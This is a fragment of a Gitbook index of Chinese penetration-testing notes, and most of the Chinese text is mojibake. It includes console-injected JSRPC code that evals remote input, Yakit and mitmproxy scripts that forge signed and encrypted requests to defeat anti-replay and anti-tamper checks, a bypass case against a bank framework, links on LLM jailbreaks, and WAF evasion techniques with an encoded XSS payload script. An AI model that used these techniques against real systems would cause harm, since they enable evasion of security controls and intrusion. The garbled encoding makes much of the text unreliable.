yakitçƒ­åŠ è½½ä»£ç  m = {\"username\":\"admin\",\"password\":password} //è½¬åŒ–ä¸ºjsonå­—ç¬¦ä¸² data = json.dumps(m) key = codec.DecodeHex(\"31323334313233343132333431323334\")~ iv = codec.DecodeHex(\"1383d3da1795e731f78388eefc50dd03\")~ signature = codec.AESCBCEncryptWithPKCS7Padding(key, data, iv)~ signature = codec.EncodeBase64(signature) return signature AES CBCæ¨¡å¼ï¼ˆKey/IVé€šè¿‡RSAåŠ å¯†ä¼ è¾“ï¼‰ å…¨åŠ å¯†æµç¨‹ æœåŠ¡ç«¯ï¼špub1ï¼Œpri1ï¼Œkey1ï¼Œiv1 å®¢æˆ·ç«¯ï¼špub2ï¼Œpri2ï¼Œkey2ï¼Œiv2 è¯·æ±‚åŒ…ï¼š å®¢æˆ·ç«¯éšæœºç”ŸæˆaesåŠ å¯†æ‰€éœ€çš„key2ä¸iv2ï¼Œå®¢æˆ·ç«¯ç”¨pub1åŠ å¯†key2ä¸iv2ï¼Œkey2åŠ å¯†æ•°æ®dataï¼Œä¼ è¾“çš„æ•°æ®ä¸º{enc_dataï¼Œenc_key,enc_iv} æœåŠ¡ç«¯å…ˆä½¿ç”¨pri1æ¥è§£å¯†å¾—åˆ°key2ä¸iv2ï¼Œå†ä½¿ç”¨å…¶è§£å¯†æ•°æ®data è¿”å›åŒ…ï¼š æœåŠ¡ç«¯éšæœºç”ŸæˆaesåŠ å¯†æ‰€éœ€çš„key1ä¸iv1ï¼ŒæœåŠ¡ç«¯ä½¿ç”¨pub2åŠ å¯†key1ä¸iv1ï¼Œkey1åŠ å¯†æ•°æ®dataï¼Œä¼ è¾“çš„æ•°æ®ä¸º{enc_dataï¼Œenc_key,enc_iv} å®¢æˆ·ç«¯å…ˆä½¿ç”¨pri2æ¥è§£å¯†å¾—åˆ°key1ä¸iv1ï¼Œå†ä½¿ç”¨å…¶è§£å¯†æ•°æ®data é˜²é‡æ”¾ jsæ··æ·† jsæ··æ·†äº†è§£ webpack JSRPCä½¿ç”¨ consoleæ³¨å…¥jsrpc function Hlclient(wsURL) { this.wsURL = wsURL; this.handlers = { _execjs: function (resolve, param) { var res = eval(param) if (!res) { resolve(\"æ²¡æœ‰è¿”å›å€¼\") } else { resolve(res) } } }; this.socket = undefined; if (!wsURL) { throw new Error('wsURL can not be empty!!') } this.connect() } Hlclient.prototype.connect = function () { console.log('begin of connect to wsURL: ' + this.wsURL); var _this = this; try { this.socket = new WebSocket(this.wsURL); this.socket.onmessage = function (e) { _this.handlerRequest(e.data) } } catch (e) { console.log(\"connection failed,reconnect after 10s\"); setTimeout(function () { _this.connect() }, 10000) } this.socket.onclose = function () { console.log('rpcå·²å…³é—­'); setTimeout(function () { _this.connect() }, 10000) } this.socket.addEventListener('open', (event) => { console.log(\"rpcè¿æ¥æˆåŠŸ\"); }); this.socket.addEventListener('error', (event) => { console.error('rpcè¿æ¥å‡ºé”™,è¯·æ£€æŸ¥æ˜¯å¦æ‰“å¼€æœåŠ¡ç«¯:', event.error); }); }; Hlclient.prototype.send = function (msg) { this.socket.send(msg) } Hlclient.prototype.regAction = function (func_name, func) { if (typeof func_name !== 'string') { throw new Error(\"an func_name must be string\"); } if (typeof func !== 'function') { throw new Error(\"must be function\"); } console.log(\"register func_name: \" + func_name); this.handlers[func_name] = func; return true } //æ”¶åˆ°æ¶ˆæ¯åè¿™é‡Œå¤„ç†ï¼Œ Hlclient.prototype.handlerRequest = function (requestJson) { var _this = this; try { var result = JSON.parse(requestJson) } catch (error) { console.log(\"catch error\", requestJson); result = transjson(requestJson) } //console.log(result) if (!result['action']) { this.sendResult('', 'need request param {action}'); return } var action = result[\"action\"] var theHandler = this.handlers[action]; if (!theHandler) { this.sendResult(action, 'action not found'); return } try { if (!result[\"param\"]) { theHandler(function (response) { _this.sendResult(action, response); }) return } var param = result[\"param\"] try { param = JSON.parse(param) } catch (e) {} theHandler(function (response) { _this.sendResult(action, response); }, param) } catch (e) { console.log(\"error: \" + e); _this.sendResult(action, e); } } Hlclient.prototype.sendResult = function (action, e) { if (typeof e === 'object' && e !== null) { try { e = JSON.stringify(e) } catch (v) { console.log(v)//ä¸æ˜¯jsonæ— éœ€æ“ä½œ } } this.send(action + atob(\"aGxeX14\") + e); } function transjson(formdata) { var regex = /\"action\":(?.*?),/g var actionName = regex.exec(formdata).groups.actionName stringfystring = formdata.match(/{..data..:.*..\\w+..:\\s...*?..}/g).pop() stringfystring = stringfystring.replace(/\\\\\"/g, '\"') paramstring = JSON.parse(stringfystring) tens = `{\"action\":` + actionName + `,\"param\":{}}` tjson = JSON.parse(tens) tjson.param = paramstring return tjson } æ³¨å†Œç›‘å¬ var demo = new Hlclient(\"ws://127.0.0.1:12080/ws?group=zzz\"); é€šè¿‡v_jstoolsæˆ–è€…å…³é”®å­—å¯»æ‰¾æ–­ç‚¹ v_jstoolsé…ç½® hook-console hook-function hook-eval å‹¾é€‰ `æ˜¯å¦åœ¨è°ƒè¯•è¾“å‡ºæ—¶ï¼Œè¾“å‡ºå‡½æ•°å‡ºå‘çš„åœ°å€` å‹¾é€‰ `æ˜¯å¦å¯ç”¨ä¸‹é¢å‡ ä¸ªåŠ è§£å¯†å‡½æ•°æŒ‚é’©è¾“å‡ºåŠŸèƒ½` hook-JSON.parse hook-JSON.stringify hook-escape hook-atob hook-btoa v_jstoolsï¼šHOOK json å®šä½ å…³é”®å­— encrypt decrypt aes åŠ å¯†åº“ è¯·æ±‚å¤´é”®å€¼ .... consoleæ³¨å†Œè¯·æ±‚åŒ…æ‰€éœ€è¦çš„å˜é‡å’Œå‡½æ•° è¿è¡Œåˆ°æ–­ç‚¹æ—¶ï¼Œæ³¨å†Œå…¨å±€å˜é‡ æ³¨æ„ï¼šè¿™é‡Œç›´æ¥åœ¨åŒä¸€ä¸ªæµè§ˆå™¨ä¸­å¤åˆ¶é¡µé¢è¿›è¡Œ //æ—¶é—´æˆ³ window.time = Date.parse //requestId window.id = p //vå‡½æ•° window.v1 = v //ç­¾å window.m = a.a.MD5 //å‡è®¾åŠ å¯†å‡½æ•°let data = r.encVal(m)ï¼Œè°ƒç”¨åŠ å¯†å³ä¸ºenc.encVal(param) window.enc = r æ³¨å†Œè¿œç¨‹è°ƒç”¨å‡½æ•° // encä¸ºjsrpcå‡½æ•°åå³action=enc demo.regAction(\"enc\", function (resolve,param) { // è¯·æ±‚éœ€è¦çš„å„ç§å€¼ let timestamp = time(new Date()); let requestid = id(); let v_data = JSON.stringify(v1(param)); let sign = m(v_data + requestid + timestamp).toString(); // è°ƒç”¨æ³¨å†Œçš„å…¨å±€å‡½æ•°è·å¾—å€¼ let encstr = enc(v_data); // è¿”å›æ•°æ® let res = { \"timestamp\":timestamp, \"requestid\":requestid, \"encstr\":encstr, \"sign\":sign }; resolve(res); }) demo.regAction(\"dec\", function (resolve,param) { // è¯·æ±‚éœ€è¦çš„å„ç§å€¼ let timestamp = time(new Date()); let requestid = id(); let v_data = JSON.stringify(v1(param)); let sign = m(v_data + requestid + timestamp).toString(); // è°ƒç”¨æ³¨å†Œçš„å…¨å±€å‡½æ•°è·å¾—å€¼ let encstr = dec(v_data); // è¿”å›æ•°æ® let res = { \"timestamp\":timestamp, \"requestid\":requestid, \"encstr\":encstr, \"sign\":sign }; resolve(res); }) è°ƒè¯•jsrpc POST /go group=zzz&action=req&data= ç¼–å†™è¯·æ±‚æ›¿æ¢ä»£ç  1.è”åŠ¨Yakitçƒ­åŠ è½½ è¯·æ±‚åŠ å¯† // å®šä¹‰åŠ å¯†å‡½æ•° func get_enc(data){ //JSrpcçš„group group = \"zzz\"; //jsrpcçš„action action = \"enc\"; rsp,rep,err = poc.Post(\"http://127.0.0.1:12080/go\",poc.replaceBody(\"group=\"+group+\"&action=\"+action+\"&param=\"+data, false),poc.appendHeader(\"content-type\", \"application/x-www-form-urlencoded\")) if(err){ return(err) } return json.loads(rsp.GetBody())[\"data\"] } // beforeRequest å…è®¸å‘é€æ•°æ®åŒ…å‰å†åšä¸€æ¬¡å¤„ç†ï¼Œå®šä¹‰ä¸º func(origin []byte) []byte beforeRequest = func(req) { //è·å–è¯·æ±‚ä½“ req_body = poc.GetHTTPPacketBody(req) // é€šè¿‡jsprcè°ƒç”¨è·å–éœ€è¦çš„å‚æ•° res = get_enc(string(req_body)) res = json.loads(res) //ä¿®æ”¹è¯·æ±‚å¤´ req = poc.ReplaceHTTPPacketHeader(req, \"requestId\", res[\"requestid\"]) req = poc.ReplaceHTTPPacketHeader(req, \"timestamp\", res[\"timestamp\"]) req = poc.ReplaceHTTPPacketHeader(req, \"sign\", res[\"sign\"]) //è¯·æ±‚ä½“æ›¿æ¢ä¸ºåŠ å¯†æ•°æ® req = poc.ReplaceHTTPPacketBody(req, res[\"encstr\"]) // è¿”å›åŠ å¯†åçš„æ•°æ® return []byte(req) } è§£å¯†è¯·æ±‚ // å®šä¹‰è§£å¯†å¯†å‡½æ•° func get_dec(data){ //JSrpcçš„group group = \"zzz\"; //jsrpcçš„action action = \"dec\"; rsp,rep,err = poc.Post(\"http://127.0.0.1:12080/go\",poc.replaceBody(\"group=\"+group+\"&action=\"+action+\"&param=\"+data, false),poc.appendHeader(\"content-type\", \"application/x-www-form-urlencoded\")) if(err){ return(err) } return json.loads(rsp.GetBody())[\"data\"] } // afterRequest å…è®¸å¯¹æ¯ä¸€ä¸ªè¯·æ±‚çš„å“åº”åšå¤„ç†ï¼Œå®šä¹‰ä¸º func(origin []byte) []byte afterRequest = func(rsp) { // è·å–å“åº”ä½“ rsp_body = poc.GetHTTPPacketBody(rsp) // é€šè¿‡jsprcè°ƒç”¨è·å–æ˜æ–‡ res = get_dec(string(rsp_body)) // æ›¿æ¢å“åº”ä½“ rsp = poc.ReplaceBody(rsp, res, false ) // è¿”å›è§£ç åçš„æ•°æ® return []byte(rsp) } 2.mitmä¸­è½¬ mitm.py import json import time import hashlib import uuid from mitmproxy import http import requests import requests # é™åˆ¶åŸŸå domain = \"http://39.98.108.20:8085/api/\" def request(flow: http.HTTPFlow) -> None: if flow.request.pretty_url.startswith(domain): # æå–åŸå§‹è¯·æ±‚ä½“ original_body = flow.request.content.decode('utf-8') data = {\"group\": \"zzz\", \"action\": \"req\", \"param\": original_body} res = requests.post(\"http://127.0.0.1:12080/æ³¨å†Œå…¨å±€å˜é‡\",data=data) res_json = json.loads(res.text)[\"data\"] data_json = json.loads(res_json) print(data_json) # å¯¹è¯·æ±‚ä½“è¿›è¡ŒåŠ å¯†å¤„ç†ï¼ˆè¿™é‡Œå‡è®¾åŠ å¯†æ–¹æ³•æ˜¯ç®€å•çš„å“ˆå¸Œï¼‰ encrypted_body = data_json[\"encstr\"] # æ›¿æ¢è¯·æ±‚ä½“ flow.request.text = encrypted_body # ç”Ÿæˆ requestIdï¼Œsign å’Œ timestamp request_id = data_json[\"requestid\"] timestamp = data_json[\"timestamp\"] sign = data_json[\"sign\"] # æ·»åŠ æˆ–æ›¿æ¢è¯·æ±‚å¤´ flow.request.headers[\"requestId\"] = request_id flow.request.headers[\"timestamp\"] = str(timestamp) flow.request.headers[\"sign\"] = sign å¯åŠ¨ mitmproxy -p 8083 -s mitm.py è®¾ç½®burpä¸Šæ¸¸ä»£ç† å®ç°å¦‚ä¸‹æ•ˆæœ mitmproxyæŒ‰å›è½¦å¥æŸ¥çœ‹å…·ä½“flow æ¡ˆä¾‹ Cap4jæ¡†æ¶ æŸé“¶è¡Œå¼€å‘æ¡†æ¶ é˜²ç¯¡æ”¹X-VALID-Token é˜²é‡æ”¾X-AntiReply-Tokenï¼ˆå¯†æ–‡æ¯æ¬¡ä¸åŒï¼‰ èº«ä»½è®¤è¯AUTHåŠ å¯†ï¼ˆå¯†æ–‡æ¯æ¬¡ä¸åŒï¼‰ å®šæ—¶è¯·æ±‚/api/refershtokenæ¥å£ æƒ…å†µ1 å¦‚æœä¼ è¾“çš„æ•°æ®ä¸ä¸ºJSONæ ¼å¼ï¼Œåªéœ€è¦å°†POSTè¯·æ±‚æ”¹ä¸ºæ–‡ä»¶ä¸Šä¼ è¯·æ±‚æ ¼å¼å³å¯ç»•è¿‡ æƒ…å†µ2 å¦‚æœä¼ è¾“çš„æ•°æ®ä¸ºJSONæ ¼å¼ï¼Œé€šè¿‡jsrpc+yakitè¿›è¡Œç»•è¿‡ æ³¨æ„ï¼šä¼šå®šæ—¶è¯·æ±‚/api/refershtokenæ¥å£ä¼šåˆ·æ–°access-tokenï¼Œå¯¼è‡´ç”Ÿæˆçš„X-AntiReply-Tokenï¼ŒAUTHä¼šæ”¹å˜ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°æ³¨å†Œå…¨å±€å˜é‡ å…¶ä»–å‚è€ƒæ¡ˆä¾‹ https://xz.aliyun.com/t/15969?time__1311=GqjxcD2DnD0Du7Dl2%2BY0%3Dt53wDg7QDmOAbD https://xz.aliyun.com/t/16497?time__1311=GuD%3Dqmx%2Bxfxx%2FD0lWGkDuCagYY5Kw%2B4pD Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-06 21:30:56 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/AIå¤§æ¨¡å‹.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/AIå¤§æ¨¡å‹.html","title":"AIå¤§æ¨¡å‹","keywords":"","body":"AIå¤§æ¨¡å‹ è¿‡æœŸçš„LLM è¶Šç‹±ä»£ç  è¶Šç‹± Llama-3.1-8B-Instruct â€“ æ°åŠ›çš“åš AI çš„è§†è§‰æ³¨å…¥æ”»å‡» å¤§æ¨¡å‹ï¼ˆChatGPTï¼‰â€œè¯­æ–™æ±¡æŸ“â€ç¬¬ä¸€çœŸå®æ¡ˆä¾‹ https://app.follow.is/feeds/collections/83210461062246400?view=0 Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 15:19:42 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/Wafç»•è¿‡å­¦ä¹ .html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/Wafç»•è¿‡å­¦ä¹ .html","title":"WAFç»•è¿‡å­¦ä¹ ","keywords":"","body":"çŸ¥å·±çŸ¥å½¼ WAFåŠŸèƒ½ä»‹ç»ï¼ˆå…¥é—¨æ‰«ç›²ç¯‡ï¼‰ - ä¸€è§‰é†’æ¥å†™ç¨‹åº - åšå®¢å›­ WAFçš„å·¥ä½œæµç¨‹ é¢„å¤„ç† ç½‘ç»œå±‚è¿‡æ»¤ï¼šIPé»‘ç™½åå• ç”±äºHTTPæ˜¯åº”ç”¨å±‚çš„åè®®ï¼Œæ¯æ¬¡WAFéƒ½è¦è§£æå®ƒï¼Œä¼šé€ æˆå¾ˆå¤§æ€§èƒ½æŸè€—ã€‚è€Œå¯¹äºæŸäº›ç»å¸¸å‘æ¶æ„è¯·æ±‚çš„IPæˆ–è¿›è¡ŒCCæ”»å‡»çš„IPï¼Œå¦‚æœèƒ½å¤Ÿåœ¨ç½‘ç»œå±‚å°±æŠŠå®ƒä»¬æ‹¦æˆªäº†ï¼Œå¯¹WAFæ€§èƒ½æ˜¯æœ‰å¾ˆå¤§çš„æå‡ã€‚ åº”ç”¨å±‚è¿‡æ»¤ï¼šåœ¨æ¥æ”¶åˆ°æ•°æ®è¯·æ±‚æµé‡æ—¶ä¼šå…ˆåˆ¤æ–­æ˜¯å¦ä¸ºHTTP/HTTPSè¯·æ±‚ï¼Œä¹‹åä¼šæŸ¥çœ‹æ­¤URLè¯·æ±‚æ˜¯å¦åœ¨ç™½åå•ä¹‹å†…ï¼Œå¦‚æœè¯¥URLè¯·æ±‚åœ¨ç™½åå•åˆ—è¡¨é‡Œï¼Œç›´æ¥äº¤ç»™åç«¯WebæœåŠ¡å™¨è¿›è¡Œå“åº”å¤„ç†ï¼Œå¯¹äºä¸åœ¨ç™½åå•ä¹‹å†…çš„å¯¹æ•°æ®åŒ…è§£æåè¿›å…¥åˆ°è§„åˆ™æ£€æµ‹éƒ¨åˆ†ã€‚ è§„åˆ™æ£€æµ‹ è§£æåçš„æ•°æ®åŒ…ä¼šè¿›å…¥åˆ°æ£€æµ‹ä½“ç³»ä¸­è¿›è¡Œè§„åˆ™åŒ¹é…ï¼Œæ£€æŸ¥è¯¥æ•°æ®è¯·æ±‚æ˜¯å¦ç¬¦åˆè§„åˆ™ï¼Œè¯†åˆ«å‡ºæ¶æ„æ”»å‡»è¡Œä¸ºã€‚ å¤„ç†æ¨¡å— é’ˆå¯¹ä¸åŒçš„æ£€æµ‹ç»“æœï¼Œå¤„ç†æ¨¡å—ä¼šåšå‡ºä¸åŒçš„å®‰å…¨é˜²å¾¡åŠ¨ä½œï¼Œå¦‚æœç¬¦åˆè§„åˆ™åˆ™äº¤ç»™åç«¯WebæœåŠ¡å™¨è¿›è¡Œå“åº”å¤„ç†ï¼Œå¯¹äºä¸ç¬¦åˆè§„åˆ™çš„è¯·æ±‚ä¼šæ‰§è¡Œç›¸å…³çš„é˜»æ–­ã€è®°å½•ã€å‘Šè­¦å¤„ç†ã€‚ æ—¥å¿—è®°å½• WAFåœ¨å¤„ç†çš„è¿‡ç¨‹ä¸­ä¹Ÿä¼šå°†æ‹¦æˆªå¤„ç†çš„æ—¥å¿—è®°å½•ä¸‹æ¥ï¼Œæ–¹ä¾¿ç”¨æˆ·åœ¨åç»­ä¸­å¯ä»¥è¿›è¡Œæ—¥å¿—æŸ¥çœ‹åˆ†æã€‚ WAFåˆ†ç±» æœ¬æ–‡ä»¥å®‰å…¨ç‹—ä¸ºä¾‹å­è¿›è¡Œç®€å•å­¦ä¹  WAFéƒ¨ç½²ä½ç½® è¯·æ±‚ â†’ CDN â†’ äº‘waf â†’ ç¡¬waf â†’ WEBæœåŠ¡å™¨ â†’ è½¯waf â†’ WEBåº”ç”¨ç¨‹åºï¼ˆä»£ç wafï¼‰ â†’ (æ•°æ®åº“) å‚¨å¤‡çŸ¥è¯† wafäº†è§£ ç¼–ç å’Œç¼–ç¨‹è¯­è¨€å‡½æ•° httpåè®® webæœåŠ¡å™¨ç‰¹æ€§ äº’è”ç½‘æ ‡å‡†æ–‡æ¡£RFC å¸¸è§ç»•è¿‡æ‰‹æ³• è¿‚å›ä½œæˆ˜ç±» ä¸»æ‰“ä¸€ä¸ªä¾§é¢ç»•è¿‡ï¼Œåˆ©ç”¨å„ç§ç¼ºé™·å’Œç‰¹æ€§ä½¿å¾—wafæ²¡æœ‰è§£æåˆ°payloadï¼Œè€Œåç«¯å¯ä»¥æ­£å¸¸è§£æï¼Œä¸ä¸wafçš„è§„åˆ™å’Œç­–ç•¥ç¡¬åˆšã€‚ WebæœåŠ¡å™¨ç‰¹æ€§ WebæœåŠ¡å™¨è§£æä¸wafè§£æä¸åŒç»•è¿‡ IIS+ASP % å¯¹äºURLè¯·æ±‚çš„å‚æ•°å€¼ä¸­çš„%ï¼Œå¦‚æœå’Œåé¢çš„å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²åœ¨URLç¼–ç è¡¨ä¹‹å¤–ï¼ŒASPè„šæœ¬å¤„ç†æ—¶ä¼šå°†å…¶å¿½ç•¥ã€‚ select â†’ se%lect unicode IISä¼šè‡ªåŠ¨è§£ç unicode HPP--å‚æ•°æ±¡æŸ“ ä¼ é€’å¤šä¸ªç›¸åŒå‚æ•°ï¼Œåˆ©ç”¨wafå’ŒwebæœåŠ¡å™¨è§£æçš„å‚æ•°ä¸åŒæ¥è¿›è¡Œç»•è¿‡ Web ç¯å¢ƒ å‚æ•°è·å–å‡½æ•° è·å–åˆ°çš„å‚æ•° PHP/Apache $_GET(\"par\") last JSP/Tomcat Request.getParameter(\"par\") first Perl(CGI)/Apache Param(\"par\") first Python/Apache getvalue(\"par\") [\"first\",\"last\"] ASP.NET/IIS Request.QueryString(\"par\") first,last ç•¸å½¢è¯·æ±‚å¤´ WebæœåŠ¡å™¨å¯ä»¥è§£æç•¸å½¢è¯·æ±‚å¤´ï¼Œä½†æ˜¯Wafä¸èƒ½è§£æç•¸å½¢è¯·æ±‚å¤´ éƒ½ä¸èƒ½è§£æç•¸å½¢è¯·æ±‚å¤´ï¼Œåˆ©ç”¨WebæœåŠ¡å™¨çš„è§£ææµç¨‹ æ¯”å¦‚shiroçš„ä¸€ä¸ªç»•è¿‡æ–¹å¼ï¼Œä½¿ç”¨ç•¸å½¢è¯·æ±‚å¤´æ¥ç»•è¿‡wafã€‚å› ä¸ºshiroæ˜¯å…ˆå¤„ç†cookieï¼Œç„¶åè¯·æ±‚åˆ°servletè¢«è§£æï¼Œæ‰€ä»¥rememberMeå€¼æ˜¯ä¼šå¤„ç†çš„ã€‚ åç«¯è¯­è¨€ç‰¹æ€§ åç«¯ä»£ç è§£æä¸wafè§£æä¸åŒ wafæ²¡æœ‰æ ¹æ®åç«¯ä»£ç æ¥ä¿®æ”¹ç­–ç•¥å’Œè§„åˆ™ ç¼–ç  å¯¹è¯·æ±‚æ•°æ®è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚urlç¼–ç ï¼ŒUnicodeç¼–ç ï¼ŒBase64ç¼–ç ç­‰ï¼Œå¦‚æœwafå¯¹æ•°æ®ä¸èƒ½æœ‰æ•ˆçš„è§£ç ï¼Œè€Œåº”ç”¨åç«¯èƒ½å¤Ÿæ­£å¸¸è§£ç ï¼Œå°±å¯ä»¥ç»•è¿‡wafã€‚ æ¯”å¦‚ Jsonæ•°æ®æ”¯æŒUnicodeç¼–ç  Base64ç¼–ç  â€‹ JSPæ”¯æŒå¤šé‡Unicodeç¼–ç  javaæ”¯æŒçš„ç¼–ç  //res {\"Big5\",\"Big5-HKSCS\",\"CESU-8\",\"EUC-JP\",\"EUC-KR\",\"GB18030\",\"GB2312\",\"GBK\",\"IBM-Thai\",\"IBM00858\",\"IBM01140\",\"IBM01141\",\"IBM01142\",\"IBM01143\",\"IBM01144\",\"IBM01145\",\"IBM01146\",\"IBM01147\",\"IBM01148\",\"IBM01149\",\"IBM037\",\"IBM1026\",\"IBM1047\",\"IBM273\",\"IBM277\",\"IBM278\",\"IBM280\",\"IBM284\",\"IBM285\",\"IBM290\",\"IBM297\",\"IBM420\",\"IBM424\",\"IBM437\",\"IBM500\",\"IBM775\",\"IBM850\",\"IBM852\",\"IBM855\",\"IBM857\",\"IBM860\",\"IBM861\",\"IBM862\",\"IBM863\",\"IBM864\",\"IBM865\",\"IBM866\",\"IBM868\",\"IBM869\",\"IBM870\",\"IBM871\",\"IBM918\",\"ISO-2022-CN\",\"ISO-2022-JP\",\"ISO-2022-JP-2\",\"ISO-2022-KR\",\"ISO-8859-1\",\"ISO-8859-13\",\"ISO-8859-15\",\"ISO-8859-2\",\"ISO-8859-3\",\"ISO-8859-4\",\"ISO-8859-5\",\"ISO-8859-6\",\"ISO-8859-7\",\"ISO-8859-8\",\"ISO-8859-9\",\"JIS_X0201\",\"JIS_X0212-1990\",\"KOI8-R\",\"KOI8-U\",\"Shift_JIS\",\"TIS-620\",\"US-ASCII\",\"UTF-16\",\"UTF-16BE\",\"UTF-16LE\",\"UTF-32\",\"UTF-32BE\",\"UTF-32LE\",\"UTF-8\",\"windows-1250\",\"windows-1251\",\"windows-1252\",\"windows-1253\",\"windows-1254\",\"windows-1255\",\"windows-1256\",\"windows-1257\",\"windows-1258\",\"windows-31j\",\"x-Big5-HKSCS-2001\",\"x-Big5-Solaris\",\"x-COMPOUND_TEXT\",\"x-euc-jp-linux\",\"x-EUC-TW\",\"x-eucJP-Open\",\"x-IBM1006\",\"x-IBM1025\",\"x-IBM1046\",\"x-IBM1097\",\"x-IBM1098\",\"x-IBM1112\",\"x-IBM1122\",\"x-IBM1123\",\"x-IBM1124\",\"x-IBM1166\",\"x-IBM1364\",\"x-IBM1381\",\"x-IBM1383\",\"x-IBM300\",\"x-IBM33722\",\"x-IBM737\",\"x-IBM833\",\"x-IBM834\",\"x-IBM856\",\"x-IBM874\",\"x-IBM875\",\"x-IBM921\",\"x-IBM922\",\"x-IBM930\",\"x-IBM933\",\"x-IBM935\",\"x-IBM937\",\"x-IBM939\",\"x-IBM942\",\"x-IBM942C\",\"x-IBM943\",\"x-IBM943C\",\"x-IBM948\",\"x-IBM949\",\"x-IBM949C\",\"x-IBM950\",\"x-IBM964\",\"x-IBM970\",\"x-ISCII91\",\"x-ISO-2022-CN-CNS\",\"x-ISO-2022-CN-GB\",\"x-iso-8859-11\",\"x-JIS0208\",\"x-JISAutoDetect\",\"x-Johab\",\"x-MacArabic\",\"x-MacCentralEurope\",\"x-MacCroatian\",\"x-MacCyrillic\",\"x-MacDingbat\",\"x-MacGreek\",\"x-MacHebrew\",\"x-MacIceland\",\"x-MacRoman\",\"x-MacRomania\",\"x-MacSymbol\",\"x-MacThai\",\"x-MacTurkish\",\"x-MacUkraine\",\"x-MS932_0213\",\"x-MS950-HKSCS\",\"x-MS950-HKSCS-XP\",\"x-mswin-936\",\"x-PCK\",\"x-SJIS_0213\",\"x-UTF-16LE-BOM\",\"X-UTF-32BE-BOM\",\"X-UTF-32LE-BOM\",\"x-windows-50220\",\"x-windows-50221\",\"x-windows-874\",\"x-windows-949\",\"x-windows-950\",\"x-windows-iso2022jp\"} å¤šæ•°æ®æ¥æº webåº”ç”¨ç¨‹åºä»å¤šä¸ªåœ°æ–¹å–å€¼ï¼Œå¦‚ # php $param = $_SERVER['xxxx'] å¯ä»¥ä»GET,POST,HEADER,METHODç­‰åœ°æ–¹è·å–ç”¨æˆ·æäº¤çš„å‚æ•°ã€‚ å¦‚æœwafåªå¯¹GETï¼ŒPOSTè¿›è¡Œæ£€æµ‹,æ²¡æœ‰ä¸åç«¯ç›¸é€‚åº”ï¼Œå°±å¯ä»¥ç»•è¿‡ã€‚ HTTPåè®® åˆ†å—ä¼ è¾“ Burpæ’ä»¶ï¼šhttps://github.com/c0ny1/chunked-coding-converter Transfer-Encoding: chunked # è¡¨ç¤ºBODYçš„ä¼ è¾“ç¼–ç æ–¹å¼ä¸ºchunkedï¼ˆæ— Content-Lengthå­—æ®µï¼‰ 3 # æŒ‡æ˜ä¼ è¾“çš„æ•°æ®é•¿åº¦ a=1 0 # è¡¨ç¤ºä¼ è¾“ç»“æŸ keep-alive httpé•¿è¿æ¥ï¼Œå‘é€å¤šä¸ªæ•°æ®åŒ…è¯·æ±‚ï¼Œæ„Ÿè§‰è·Ÿè¯·æ±‚èµ°ç§å¾ˆåƒ Connection: Keep-Alive éœ€è¦å…³é—­ multipart/form-data Multipartæ‰€ä»¥ä½¿ç”¨è¯·æ±‚ä¸æ™®é€šçš„GET/POSTå‚æ•°ä¼ è¾“æœ‰éå¸¸å¤§çš„åŒºåˆ«ï¼Œå› ä¸ºMultipartè¯·æ±‚éœ€è¦åç«¯Webåº”ç”¨è§£æè¯¥è¯·æ±‚åŒ…ï¼ŒWebå®¹å™¨ä¹Ÿä¸ä¼šè§£æMultipartè¯·æ±‚ã€‚WAFå¯èƒ½ä¼šè§£æMultipartä½†æ˜¯å¾ˆå¤šæ—¶å€™å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œæ¯”å¦‚å¾ˆå¤šWAFæ— æ³•å¤„ç†ä¸€ä¸ªæ•°æ®é‡è¾ƒå¤§çš„Multipartè¯·æ±‚æˆ–è€…è§£æMultipartæ—¶ä¸æ ‡å‡†å¯¼è‡´ç»•è¿‡ã€‚ æ›´å¤šå…³äºmultipart/form-dataçš„ç»•è¿‡æ€è·¯ï¼šæœˆå½±æ–‘é©³--do9gy's blog (moonslow.com) chrestç¼–ç  content-type: charest=cp037 ibm869 ibm870 ibm871 ibm918 iso-2022-cn iso-2022-jp iso-2022-jp-2 iso-2022-kr iso-8859-1 iso-8859-13 iso-8859-15 è„šæœ¬ import urllib.parse payload = 'alert(\"xss\")' print(urllib.parse.quote_plus(payload.encode(\"IBM037\" ))) Accept-Encoding: Accept-Encoding: gzip Accept-Encoding: compress Accept-Encoding: deflate Accept-Encoding: br Accept-Encoding: identity Accept-Encoding: * wafç‰¹æ€§ éƒ¨ç½²æ–¹å¼ï¼Œç­–ç•¥ä¸è§„åˆ™ç¼ºé™· äº‘waf é€šè¿‡CNAMEæ¥å…¥å°†ç½‘ç«™åŸŸåæ·»åŠ åˆ°WAFåï¼Œç½‘ç«™æ‰€æœ‰çš„ä¸šåŠ¡æµé‡å°†è¢«å¼•æµåˆ°WAFè¿›è¡Œæ£€æµ‹ã€‚WAFè¿‡æ»¤Webåº”ç”¨æ”»å‡»åï¼Œå°†æ­£å¸¸çš„ä¸šåŠ¡æµé‡è½¬å‘å›æºç«™æœåŠ¡å™¨ï¼Œä»è€Œä¿éšœç½‘ç«™çš„ä¸šåŠ¡å®‰å…¨å’Œæ•°æ®å®‰å…¨ã€‚æ­¤æ—¶ï¼ŒWAFä½œä¸ºä¸€ä¸ªåå‘ä»£ç†é›†ç¾¤ï¼ŒåŒæ—¶å‚ä¸æµé‡çš„æ£€æµ‹å’Œè½¬å‘ã€‚ æ‰€ä»¥å¦‚æœå¯ä»¥æ‰¾åˆ°ç›®æ ‡çš„çœŸå®ipï¼Œå°±å¯ä»¥ç»•è¿‡äº‘wafã€‚ åƒä¸‹é¢è¿™æ ·çš„æ˜¯ä¸è¡Œçš„ äº‘wafPingå‡ºæ¥æ˜¯è¿™ç§çš„hlpqjurlppnsnvzs72xcfxxxxx7htyxpit3c39.yundunwaf3.com 